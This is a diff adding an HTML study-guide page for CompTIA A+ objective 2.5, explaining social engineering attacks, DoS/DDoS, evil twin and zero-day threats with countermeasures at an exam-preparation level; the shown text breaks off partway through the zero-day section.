@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CompTIA A+ 2.5 — Compare and Contrast Common Social Engineering Attacks, Threats, and Vulnerabilities</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Crimson+Pro:ital,wght@0,300;0,400;0,500;0,600;1,400;1,500&family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600&display=swap');
+
+  :root {
+    --bg: #fafaf8;
+    --surface: #ffffff;
+    --surface2: #f5f4f0;
+    --border: #e5e2d9;
+    --border2: #d4d0c4;
+    --text: #1a1a18;
+    --muted: #6b6860;
+    --accent: #c0392b;
+    --accent2: #2c3e6b;
+    --accent3: #1a6b3a;
+    --accent4: #b5590a;
+    --accent-light: #fdf2f1;
+    --accent2-light: #f0f2f8;
+    --accent3-light: #f0f8f3;
+    --accent4-light: #fdf5ed;
+    --serif: 'Crimson Pro', Georgia, serif;
+    --sans: 'Inter', system-ui, sans-serif;
+    --mono: 'JetBrains Mono', monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  .top-nav { position: sticky; top: 0; z-index: 100; background: var(--surface); border-bottom: 1px solid var(--border); padding: 0 40px; height: 44px; display: flex; align-items: center; justify-content: space-between; gap: 16px; }
+  .top-nav-left { display: flex; align-items: center; gap: 10px; min-width: 0; }
+  .nav-home { font-family: var(--mono); font-size: 10px; font-weight: 600; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); text-decoration: none; white-space: nowrap; transition: color 0.15s; }
+  .nav-home:hover { color: var(--accent2); }
+  .nav-home::before { content: '← '; }
+  .nav-sep { font-size: 12px; color: var(--border2); flex-shrink: 0; }
+  .nav-current { font-family: var(--sans); font-size: 12px; color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .nav-current strong { font-family: var(--mono); font-size: 11px; color: var(--accent); margin-right: 6px; }
+  .top-nav-right { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
+  .nav-prev, .nav-next { font-family: var(--mono); font-size: 10px; color: var(--muted); text-decoration: none; padding: 4px 9px; border: 1px solid var(--border); border-radius: 3px; white-space: nowrap; transition: border-color 0.15s, color 0.15s; }
+  .nav-prev:hover, .nav-next:hover { border-color: var(--border2); color: var(--accent2); }
+  .nav-prev::before { content: '← '; }
+  .nav-next::after { content: ' →'; }
+  @media (max-width: 600px) { .top-nav { padding: 0 16px; } .nav-current, .nav-sep { display: none; } }
+
+  body { background: var(--bg); color: var(--text); font-family: var(--serif); font-size: 17px; line-height: 1.75; }
+  .page { max-width: 860px; margin: 0 auto; padding: 0 40px 80px; }
+
+  .book-header { border-bottom: 3px double var(--border2); padding: 56px 0 32px; margin-bottom: 48px; }
+  .book-eyebrow { font-family: var(--mono); font-size: 11px; letter-spacing: 0.18em; text-transform: uppercase; color: var(--muted); margin-bottom: 16px; }
+  .book-eyebrow span { background: var(--accent); color: #fff; padding: 2px 8px; border-radius: 2px; margin-right: 10px; font-size: 10px; }
+  .book-title { font-family: var(--serif); font-size: clamp(26px, 4vw, 38px); font-weight: 600; line-height: 1.2; letter-spacing: -0.01em; margin-bottom: 12px; }
+  .book-subtitle { font-family: var(--sans); font-size: 14px; color: var(--muted); display: flex; gap: 20px; flex-wrap: wrap; margin-top: 16px; }
+  .book-subtitle span::before { content: '·'; color: var(--border2); margin-right: 20px; }
+  .book-subtitle span:first-child::before { display: none; }
+
+  h2.chapter { font-family: var(--serif); font-size: 26px; font-weight: 600; margin: 52px 0 6px; padding-bottom: 10px; border-bottom: 2px solid var(--border); letter-spacing: -0.01em; }
+  h2.chapter .ch-num { font-family: var(--mono); font-size: 12px; color: var(--accent); display: block; margin-bottom: 4px; letter-spacing: 0.1em; font-weight: 400; }
+  h3.section { font-family: var(--serif); font-size: 20px; font-weight: 600; margin: 36px 0 12px; }
+  h3.section::before { content: '§ '; color: var(--muted); font-weight: 300; }
+  p { margin-bottom: 16px; }
+
+  /* CALLOUTS */
+  .callout { border-left: 3px solid; padding: 14px 20px; margin: 24px 0; border-radius: 0 4px 4px 0; font-size: 15.5px; }
+  .callout p { margin-bottom: 6px; }
+  .callout p:last-child { margin-bottom: 0; }
+  .callout-title { font-family: var(--sans); font-size: 11px; font-weight: 600; letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 8px !important; }
+  .callout-exam  { border-color: var(--accent);  background: var(--accent-light); }
+  .callout-exam  .callout-title { color: var(--accent); }
+  .callout-info  { border-color: var(--accent2); background: var(--accent2-light); }
+  .callout-info  .callout-title { color: var(--accent2); }
+  .callout-tip   { border-color: var(--accent3); background: var(--accent3-light); }
+  .callout-tip   .callout-title { color: var(--accent3); }
+  .callout-warn  { border-color: var(--accent4); background: var(--accent4-light); }
+  .callout-warn  .callout-title { color: var(--accent4); }
+
+  /* ATTACK CARD — primary component */
+  .atk-card { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0 26px; }
+  .atk-header { padding: 13px 18px; display: flex; align-items: flex-start; justify-content: space-between; gap: 14px; border-bottom: 2px solid var(--border); }
+  .atk-header.social  { background: var(--accent-light);  border-bottom-color: #c0392b33; }
+  .atk-header.threat  { background: var(--accent2-light); border-bottom-color: #2c3e6b33; }
+  .atk-header.vuln    { background: var(--accent4-light); border-bottom-color: #b5590a33; }
+  .atk-name { font-family: var(--mono); font-size: 15px; font-weight: 600; color: var(--text); letter-spacing: 0.02em; line-height: 1.25; }
+  .atk-sub  { font-family: var(--sans); font-size: 12px; color: var(--muted); margin-top: 3px; }
+  .atk-tags { display: flex; gap: 5px; flex-shrink: 0; flex-wrap: wrap; justify-content: flex-end; }
+  .tag { font-family: var(--mono); font-size: 10px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; padding: 2px 8px; border-radius: 3px; white-space: nowrap; }
+  .tag-human   { background: var(--accent-light);  color: var(--accent);  border: 1px solid #c0392b44; }
+  .tag-tech    { background: var(--accent2-light); color: var(--accent2); border: 1px solid #2c3e6b44; }
+  .tag-phys    { background: var(--accent4-light); color: var(--accent4); border: 1px solid #b5590a44; }
+  .tag-high    { background: #fff0ef; color: #c0392b; border: 1px solid #c0392b44; }
+  .tag-crit    { background: #1a1a18; color: #fff; border: 1px solid transparent; }
+  .tag-target  { background: var(--accent3-light); color: var(--accent3); border: 1px solid #1a6b3a44; }
+
+  .atk-body { }
+  .atk-row { display: grid; grid-template-columns: 170px 1fr; border-bottom: 1px solid var(--border); font-family: var(--sans); font-size: 14px; }
+  .atk-row:last-child { border-bottom: none; }
+  .atk-label { font-weight: 600; color: var(--accent2); padding: 10px 16px; background: var(--surface2); border-right: 1px solid var(--border); line-height: 1.4; font-size: 13px; }
+  .atk-desc  { padding: 10px 16px; color: var(--muted); line-height: 1.6; }
+  .atk-desc strong { color: var(--text); }
+  .atk-desc em { font-style: normal; color: var(--accent2); font-weight: 600; }
+
+  /* PHISHING SUB-TYPES GRID */
+  .phishing-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 16px 0 24px; }
+  .ph-card { background: var(--surface); border: 1px solid var(--border); border-radius: 5px; overflow: hidden; }
+  .ph-head { padding: 9px 14px; font-family: var(--sans); font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.07em; border-bottom: 1px solid var(--border); }
+  .ph-head.email   { background: var(--accent-light);  color: var(--accent); }
+  .ph-head.voice   { background: var(--accent2-light); color: var(--accent2); }
+  .ph-head.sms     { background: var(--accent4-light); color: var(--accent4); }
+  .ph-head.qr      { background: var(--accent3-light); color: var(--accent3); }
+  .ph-head.spear   { background: #fdf2f1; color: var(--accent); }
+  .ph-head.whale   { background: #1a1a18; color: rgba(255,255,255,0.85); }
+  .ph-body { padding: 11px 14px; font-family: var(--sans); font-size: 13.5px; color: var(--muted); line-height: 1.55; }
+  .ph-body strong { color: var(--text); }
+
+  /* CODE BLOCK */
+  .code-block { background: #1a1a18; border-radius: 5px; padding: 14px 18px; margin: 16px 0; font-family: var(--mono); font-size: 12.5px; overflow-x: auto; }
+  .code-block .c-comment { color: rgba(255,255,255,0.3); font-style: italic; }
+  .code-block .c-tag { color: #7ec8e3; }
+  .code-block .c-attr { color: #f5d67b; }
+  .code-block .c-val { color: #a8d8a0; }
+  .code-block .c-bad { color: #ff7a7a; }
+  .code-block .c-normal { color: rgba(255,255,255,0.75); }
+
+  /* DATA TABLE */
+  .data-table { width: 100%; border-collapse: collapse; font-size: 14px; font-family: var(--sans); margin: 16px 0 24px; }
+  .data-table thead th { background: var(--text); color: rgba(255,255,255,0.8); font-size: 11px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; padding: 9px 13px; text-align: left; white-space: nowrap; }
+  .data-table tbody tr { border-bottom: 1px solid var(--border); }
+  .data-table tbody tr:last-child { border-bottom: none; }
+  .data-table td { padding: 9px 13px; vertical-align: top; line-height: 1.5; font-size: 13.5px; }
+  .data-table td:first-child { font-weight: 600; color: var(--accent2); white-space: nowrap; background: var(--surface2); font-size: 13px; }
+  .data-table tr:nth-child(even) td { background: #fdfcfb; }
+  .data-table tr:nth-child(even) td:first-child { background: var(--surface2); }
+  .cell-h { color: var(--accent);  font-weight: 600; }
+  .cell-m { color: var(--accent4); font-weight: 600; }
+  .cell-l { color: var(--accent3); font-weight: 600; }
+
+  /* DEF LIST */
+  .def-list { margin: 16px 0 24px; }
+  .def-item { padding: 11px 0; border-bottom: 1px solid var(--border); display: grid; grid-template-columns: 200px 1fr; gap: 20px; font-size: 15px; }
+  .def-item:last-child { border-bottom: none; }
+  .def-term { font-family: var(--sans); font-weight: 600; color: var(--accent2); font-size: 14px; padding-top: 1px; line-height: 1.4; }
+
+  /* VULN PANEL */
+  .vuln-panel { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 20px 0; }
+  .vuln-panel-head { background: var(--accent4-light); border-bottom: 2px solid #b5590a33; padding: 11px 18px; display: flex; align-items: center; justify-content: space-between; }
+  .vuln-panel-title { font-family: var(--sans); font-size: 11px; font-weight: 600; letter-spacing: 0.14em; text-transform: uppercase; color: var(--accent4); }
+  .vuln-row { display: grid; grid-template-columns: 200px 1fr; border-bottom: 1px solid var(--border); font-family: var(--sans); font-size: 14px; }
+  .vuln-row:last-child { border-bottom: none; }
+  .vuln-label { font-weight: 600; color: var(--accent4); padding: 11px 18px; background: var(--surface2); border-right: 1px solid var(--border); line-height: 1.4; font-size: 13px; }
+  .vuln-desc  { padding: 11px 18px; color: var(--muted); line-height: 1.6; }
+  .vuln-desc strong { color: var(--text); }
+
+  code { font-family: var(--mono); font-size: 12.5px; background: var(--surface2); border: 1px solid var(--border); padding: 1px 6px; border-radius: 3px; color: var(--accent); }
+  .key-term { font-style: italic; font-weight: 500; color: var(--accent2); }
+
+  /* SUMMARY */
+  .summary-box { background: var(--text); color: #f0ede6; border-radius: 6px; padding: 28px 32px; margin: 40px 0; }
+  .summary-box h3 { font-family: var(--sans); font-size: 11px; letter-spacing: 0.15em; text-transform: uppercase; color: rgba(255,255,255,0.35); margin-bottom: 18px; }
+  .summary-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px 32px; }
+  .summary-item { font-family: var(--sans); font-size: 13.5px; color: #c4bfb4; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.07); display: flex; gap: 10px; align-items: flex-start; }
+  .summary-item .s-sym { color: #e8b47a; font-family: var(--mono); font-size: 12px; min-width: 145px; line-height: 1.4; padding-top: 1px; flex-shrink: 0; }
+
+  .ch-divider { height: 1px; background: linear-gradient(90deg, var(--border2), transparent); margin: 48px 0; }
+
+  @media (max-width: 680px) {
+    .page { padding: 0 20px 60px; }
+    .summary-grid, .phishing-grid { grid-template-columns: 1fr; }
+    .def-item, .atk-row, .vuln-row { grid-template-columns: 1fr; }
+    .atk-label, .vuln-label { border-right: none; border-bottom: 1px solid var(--border); }
+  }
+</style>
+</head>
+<body>
+
+<nav class="top-nav">
+  <div class="top-nav-left">
+    <a class="nav-home" href="../index.html">Study Guide</a>
+    <span class="nav-sep">/</span>
+    <span class="nav-current"><strong>2.5</strong> Compare and Contrast Social Engineering Attacks, Threats, and Vulnerabilities</span>
+  </div>
+  <div class="top-nav-right">
+    <a class="nav-prev" href="./2_4-Malware-Detection-Removal.html">2.4</a>
+    <a class="nav-next" href="./2_6-SOHO-Malware-Removal.html">2.6</a>
+  </div>
+</nav>
+
+<div class="page">
+
+<div class="book-header">
+  <div class="book-eyebrow">
+    <span>2.5</span>
+    CompTIA A+ · Core 2 (220-1202) · Domain 2 — Security
+  </div>
+  <h1 class="book-title">Compare and Contrast Common Social Engineering<br>Attacks, Threats, and Vulnerabilities</h1>
+  <div class="book-subtitle">
+    <span>Objective 2.5</span>
+    <span>Domain weight: 28%</span>
+    <span>Verb: Compare/Contrast</span>
+    <span>3 categories · 24 items</span>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- OVERVIEW                                  -->
+<!-- ══════════════════════════════════════════ -->
+<h2 class="chapter"><span class="ch-num">OVERVIEW</span>Introduction</h2>
+
+<p>This objective covers three distinct but interconnected security concepts: <strong>social engineering attacks</strong> (techniques that manipulate people rather than systems), <strong>technical and network threats</strong> (attacks that target systems, applications, and infrastructure), and <strong>vulnerabilities</strong> (weaknesses in systems, policies, or configurations that threats exploit). Understanding the distinction between these categories — and the specific characteristics of each item within them — is what the "compare and contrast" verb demands.</p>
+
+<p>A technician who can identify which attack is described in a scenario, understand why it works, and know the appropriate countermeasure is better prepared both for the exam and for real-world incident response. Attackers chain these attack types together — a phishing email (social engineering) delivers malware that exploits an unpatched vulnerability to establish persistence on a non-compliant BYOD device. Understanding how the categories interact is as important as knowing each item individually.</p>
+
+<div class="callout callout-info">
+  <p class="callout-title">Three Categories — Key Distinction</p>
+  <p><strong>Social engineering</strong> = attacks on people. The technical system is often irrelevant — the human is the vulnerability being exploited. <strong>Threats</strong> = attacks on systems, networks, and applications using technical methods. <strong>Vulnerabilities</strong> = conditions or weaknesses that make attacks possible or easier. Threats exploit vulnerabilities. Social engineering exploits human psychology. The three categories work together: a threat actor uses social engineering to get credentials, exploits an unpatched vulnerability to escalate privileges, and gains access that BYOD policies failed to restrict.</p>
+</div>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- SECTION 1: SOCIAL ENGINEERING            -->
+<!-- ══════════════════════════════════════════ -->
+<h2 class="chapter"><span class="ch-num">SECTION 1</span>Social Engineering</h2>
+
+<p><span class="key-term">Social engineering</span> is the art of manipulating people into performing actions or divulging confidential information by exploiting psychological tendencies — trust, authority, urgency, fear, curiosity, and helpfulness. Social engineering attacks bypass technical security controls entirely by targeting the human element. The most technically sophisticated firewall is irrelevant if an attacker can convince an employee to hand over their credentials via a phone call.</p>
+
+<p>Social engineering success relies on well-documented psychological principles: <strong>authority</strong> (people comply with those they perceive as having authority), <strong>urgency/scarcity</strong> (pressure to act quickly prevents careful evaluation), <strong>social proof</strong> (people follow what others do), <strong>liking</strong> (people are more helpful to those they like), <strong>reciprocity</strong> (people feel obligated to return favors), and <strong>commitment/consistency</strong> (people follow through on prior commitments).</p>
+
+<h3 class="section">Phishing and Its Variants</h3>
+
+<p><span class="key-term">Phishing</span> is the use of deceptive electronic communications — most commonly email — that impersonate a trusted entity to trick the recipient into clicking a malicious link, opening a malicious attachment, or providing sensitive information (credentials, financial data, personal information). It is the most common initial access vector for both targeted attacks and mass-market cybercrime.</p>
+
+<div class="phishing-grid">
+
+  <div class="ph-card">
+    <div class="ph-head email">Phishing (Email)</div>
+    <div class="ph-body"><strong>Mass-broadcast deceptive email.</strong> Sent to thousands or millions of recipients, impersonating banks, Microsoft, PayPal, Amazon, or government agencies. Generic salutations ("Dear Customer") are a tell. Links lead to convincing fake login pages that harvest credentials. Attachments contain malware. The goal is a small percentage of a massive recipient pool clicking — even a 0.1% success rate on one million emails yields 1,000 victims.</div>
+  </div>
+
+  <div class="ph-card">
+    <div class="ph-head voice">Vishing (Voice)</div>
+    <div class="ph-body"><strong>Voice phishing — phone calls.</strong> The attacker calls the target, impersonating IT support, a bank, the IRS, or tech support (Microsoft, Apple). Uses urgency ("your account will be suspended"), fear ("we've detected fraud on your account"), or authority ("this is your IT department — we need your credentials to reset your account"). Voice conveys emotion and authority more effectively than text, making vishing often more successful per attempt than email phishing.</div>
+  </div>
+
+  <div class="ph-card">
+    <div class="ph-head sms">Smishing (SMS)</div>
+    <div class="ph-body"><strong>SMS/text message phishing.</strong> Delivers malicious links or requests via text message. Common lures: "Your package could not be delivered — confirm your address [link]," "Your bank account has been locked [link]," "You've won a prize — claim it here." Mobile users are more likely to click links without carefully examining URLs. Smishing also leverages the higher trust many users place in text messages versus email.</div>
+  </div>
+
+  <div class="ph-card">
+    <div class="ph-head qr">QR Code Phishing</div>
+    <div class="ph-body"><strong>QR codes substituted for legitimate ones.</strong> Attackers print malicious QR codes and place them over legitimate ones — on restaurant menus, parking payment kiosks, conference materials, or flyers. The victim scans the QR code expecting a legitimate URL and is instead directed to a phishing site, malware download, or fake payment portal. QR codes obscure their destination URL until after scanning, bypassing URL-verification habits.</div>
+  </div>
+
+  <div class="ph-card">
+    <div class="ph-head spear">Spear Phishing</div>
+    <div class="ph-body"><strong>Targeted phishing using personalized information.</strong> Unlike mass phishing, spear phishing is crafted for a specific individual or small group using researched personal details — name, employer, job title, colleague names, current projects, recent purchases. The personalization makes the email appear highly credible. The attacker may spend days researching the target via LinkedIn, social media, and public records. Success rate is dramatically higher than mass phishing.</div>
+  </div>
+
+  <div class="ph-card">
+    <div class="ph-head whale">Whaling</div>
+    <div class="ph-body"><strong>Spear phishing targeting executives.</strong> "Whaling" = hunting the "big fish" — CEOs, CFOs, board members, general counsels. The attacker impersonates another executive, a major client, a law firm, or a regulatory body. Common scenarios: fake legal subpoenas, fraudulent wire transfer requests from the "CEO," fake M&A documents. Executives have authority to approve large financial transactions and access to the most sensitive data.</div>
+  </div>
+
+</div>
+
+<div class="callout callout-exam">
+  <p class="callout-title">Exam Focus — Phishing Variant Identification</p>
+  <p>The exam frequently presents a scenario and asks which phishing variant it describes. The differentiators: <strong>Generic mass email = Phishing</strong>. <strong>Phone call = Vishing</strong>. <strong>Text message = Smishing</strong>. <strong>QR code = QR code phishing</strong>. <strong>Personalized/targeted email using researched details = Spear phishing</strong>. <strong>Targeting a specific C-suite executive = Whaling</strong>. Whaling is always a subset of spear phishing — all whaling is spear phishing, but not all spear phishing is whaling.</p>
+</div>
+
+<h3 class="section">Shoulder Surfing</h3>
+
+<div class="atk-card">
+  <div class="atk-header social">
+    <div>
+      <div class="atk-name">Shoulder Surfing</div>
+      <div class="atk-sub">Visual eavesdropping — watching someone enter credentials or sensitive data</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-phys">Physical</span><span class="tag tag-human">Human</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">How it works</div>
+      <div class="atk-desc">The attacker physically observes — by looking over the shoulder, using a camera, or using reflective surfaces — as the target enters a PIN, password, credit card number, or other sensitive data. The name describes the classic attack: standing behind someone and watching. Modern variants include using binoculars from a distance, positioning cameras in ATM vestibules, or using a zoom lens in a coffee shop to observe laptop screens.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Common targets</div>
+      <div class="atk-desc">ATM PIN entry; laptop login in public spaces; accessing sensitive documents on screen in open offices; entering credentials on a phone; using a cipher lock keypad. Any situation where sensitive visual information is entered or displayed in a space where others can see it.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>Privacy screens</strong> — screen filters that restrict the viewing angle to approximately 60° directly in front, making the screen black to side observers. <strong>Body positioning</strong> — position the screen away from public view when entering sensitive data. <strong>PIN pad shields</strong> — physical shields at ATMs and payment terminals block camera views of the keypad. <strong>Awareness</strong> — recognize when someone is watching and move or pause data entry.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Tailgating</h3>
+
+<div class="atk-card">
+  <div class="atk-header social">
+    <div>
+      <div class="atk-name">Tailgating</div>
+      <div class="atk-sub">Unauthorized physical access by following an authorized person through a secured door</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-phys">Physical</span><span class="tag tag-human">Human</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">The attack</div>
+      <div class="atk-desc">An unauthorized person follows immediately behind an authorized person through a badge-controlled door or secure entrance without providing their own credentials. They may hold a box of supplies to prompt the authorized person to hold the door, or simply walk confidently behind a group. Also called <strong>piggybacking</strong>, though tailgating implies the authorized person is not knowingly complicit while piggybacking may imply awareness.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Why it works</div>
+      <div class="atk-desc">Social conditioning against confrontation — most people feel uncomfortable challenging a professional-looking stranger following them through a door, especially if the person is carrying items, appears busy, or is engaging in friendly small talk. Security culture must explicitly empower employees to challenge unknown individuals and not hold doors, overriding the natural social instinct toward politeness.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>Access control vestibule (mantrap)</strong> — the definitive technical countermeasure; physically allows only one person per authentication. <strong>Security guards</strong> — verify identity of all entrants. <strong>Security culture training</strong> — empower employees to challenge anyone who has not badged through independently. <strong>Turnstiles</strong> — single-passage barriers that only allow one person per authentication event.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Impersonation</h3>
+
+<div class="atk-card">
+  <div class="atk-header social">
+    <div>
+      <div class="atk-name">Impersonation</div>
+      <div class="atk-sub">Pretending to be someone trusted to gain access, information, or compliance</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-human">Human</span><span class="tag tag-phys">Physical/Digital</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">Physical impersonation</div>
+      <div class="atk-desc">The attacker physically impersonates an IT technician ("I'm here to service the server room"), a delivery person, a fire inspector, a new employee, or an executive. Uniforms, props (tool bags, clipboards, company logos), and confident demeanor grant access that security controls deny. The target — reception, a security guard, or an employee — validates the claim based on appearance rather than verified credentials.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Identity impersonation (BEC)</div>
+      <div class="atk-desc">Digitally impersonating a specific person — a CEO sending an urgent wire transfer request, an IT administrator asking for a password reset, a vendor updating banking details for future payments. Relies on email spoofing, compromised accounts, or domains that are visually similar to legitimate ones (homograph attacks). Covered in more depth under Business Email Compromise in the Threats section.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>Verification procedures</strong> — always verify claimed identity through an independent channel (call the vendor's listed number, not the one provided by the caller). <strong>Visitor management</strong> — require ID and escort for all visitors; never let unescorted visitors access secure areas. <strong>Out-of-band verification</strong> for financial requests — any wire transfer request via email must be verbally confirmed by calling a known-good number for the requester.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Dumpster Diving</h3>
+
+<div class="atk-card">
+  <div class="atk-header social">
+    <div>
+      <div class="atk-name">Dumpster Diving</div>
+      <div class="atk-sub">Searching discarded physical materials for sensitive information</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-phys">Physical</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">What attackers find</div>
+      <div class="atk-desc">Printed documents containing usernames, passwords, network diagrams, organizational charts, phone directories, employee personally identifiable information (PII), vendor invoices, legal documents, and technical manuals. Hardware discarded without proper data destruction: hard drives, USB drives, printed circuit boards, mobile phones. Old equipment often contains configuration data, cached credentials, or network information that enables further attacks.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Legal context</div>
+      <div class="atk-desc">In most U.S. jurisdictions, once material is placed in a public trash container it is legally abandoned — access to it is generally not illegal. Private dumpsters on company property are a different matter. Organizations cannot rely on legality alone to protect discarded information — the information's sensitivity must drive disposal practices regardless of legal status.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>Cross-cut or micro-cut shredding</strong> of all documents containing sensitive information before disposal — strip-cut shredding is insufficient (documents can be reassembled). <strong>Degaussing and physical destruction</strong> of storage media before disposal (covered in Objective 2.9). <strong>Secure waste disposal</strong> — locked shred bins and contracted secure document destruction services. <strong>Clear desk policy</strong> — reduces the volume of sensitive documents that reach the disposal stream.</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- SECTION 2: THREATS                       -->
+<!-- ══════════════════════════════════════════ -->
+<h2 class="chapter"><span class="ch-num">SECTION 2</span>Threats</h2>
+
+<p>Technical threats target systems, applications, and networks using technical methods rather than (or in addition to) human manipulation. This section covers the specific threat types listed in Objective 2.5, with emphasis on the characteristics that distinguish them from one another for exam purposes.</p>
+
+<h3 class="section">Denial of Service (DoS) and Distributed DoS (DDoS)</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Denial of Service / Distributed Denial of Service</div>
+      <div class="atk-sub">Overwhelm a system with traffic or requests to make it unavailable to legitimate users</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-tech">Network</span><span class="tag tag-high">Availability</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">DoS</div>
+      <div class="atk-desc">A <strong>Denial of Service (DoS)</strong> attack originates from a <strong>single source</strong> and floods the target (a web server, network device, or application) with more requests or traffic than it can process, causing it to become slow or completely unresponsive to legitimate users. Because it comes from a single IP, DoS attacks are relatively easy to block — simply firewall the source IP. The attack's impact is limited by the bandwidth and resources of a single machine.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">DDoS</div>
+      <div class="atk-desc">A <strong>Distributed Denial of Service (DDoS)</strong> attack coordinates traffic from thousands to millions of compromised machines (a <strong>botnet</strong>) against a single target simultaneously. Because the traffic comes from many different IP addresses worldwide, simple IP blocking is ineffective. Volumetric DDoS attacks can generate traffic in the terabits-per-second range, overwhelming even major web infrastructure. Mitigation requires specialized DDoS protection services (Cloudflare, Akamai, AWS Shield) that absorb and filter attack traffic before it reaches the target.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Attack types</div>
+      <div class="atk-desc"><strong>Volumetric</strong> — flood bandwidth with massive traffic (UDP flood, ICMP flood). <strong>Protocol</strong> — exploit protocol weaknesses to exhaust server resources (SYN flood — sends SYN packets but never completes the TCP 3-way handshake, filling the server's connection table). <strong>Application layer</strong> — send legitimate-looking requests that are computationally expensive for the server to process (HTTP GET flood targeting a search function).</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Impact</div>
+      <div class="atk-desc">Loss of service availability — the attacked system cannot serve legitimate users. The CIA triad impact is on <em>Availability</em>. Financial loss for e-commerce, reputation damage, and disruption of operations. Sometimes used as a distraction — while IT focuses on the DDoS, attackers perform a separate breach elsewhere in the network.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Evil Twin</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Evil Twin</div>
+      <div class="atk-sub">Rogue Wi-Fi access point impersonating a legitimate network to intercept traffic</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-tech">Wireless</span><span class="tag tag-high">Interception</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">The attack</div>
+      <div class="atk-desc">The attacker sets up a rogue Wi-Fi access point with the same SSID (network name) as a legitimate network — "Starbucks Wi-Fi," "Airport_Free_WiFi," or a corporate SSID cloned from an existing network. The rogue AP may broadcast a stronger signal than the legitimate AP, causing devices to connect automatically. All traffic from connected devices flows through the attacker's AP, enabling interception, credential harvesting from HTTP sites, and malware injection.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Why it works</div>
+      <div class="atk-desc">Devices automatically connect to known SSIDs without verifying the access point's identity (beyond the WPA2 shared password, which the attacker replicates). On open networks (no password), any device within range may connect automatically to the stronger signal. Once connected, many applications transmit credentials in ways that the attacker can intercept, especially if the victim is tricked into accepting a fake certificate for HTTPS sites.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Countermeasures</div>
+      <div class="atk-desc"><strong>VPN</strong> — encrypts all traffic regardless of the underlying network, preventing evil twin interception. <strong>HTTPS Everywhere</strong> — ensure all sites use HTTPS; HSTS prevents certificate warnings from being bypassed. <strong>802.1X / WPA2-Enterprise</strong> — mutual authentication prevents clients from connecting to unauthenticated access points. <strong>Avoid auto-connecting</strong> to open networks. <strong>Certificate pinning</strong> in applications detects certificate substitution by an evil twin doing SSL interception.</div>
+    </div>
+  </div>
+</div>
+
+<h3 class="section">Zero-Day Attack</h3>
+
+<div class="atk-card">
+  <div class="atk-header threat">
+    <div>
+      <div class="atk-name">Zero-Day Attack</div>
+      <div class="atk-sub">Exploitation of a vulnerability unknown to the vendor — no patch exists</div>
+    </div>
+    <div class="atk-tags"><span class="tag tag-crit">Critical</span><span class="tag tag-tech">Exploit</span></div>
+  </div>
+  <div class="atk-body">
+    <div class="atk-row">
+      <div class="atk-label">Definition</div>
+      <div class="atk-desc">A <strong>zero-day vulnerability</strong> is a security flaw that is unknown to the software vendor — "zero days" referring to the number of days the vendor has had to create a patch. A <strong>zero-day exploit</strong> is code that weaponizes the vulnerability. Because no patch exists, signature-based defenses cannot detect it, and patching (the standard mitigation for vulnerabilities) is impossible. Zero-days are among the most dangerous threats because all standard defenses — patching, AV signatures, vulnerability scanners — are ineffective.</div>
+    </div>
+    <div class="atk-row">
+      <div class="atk-label">Discovery and disclosure</div>
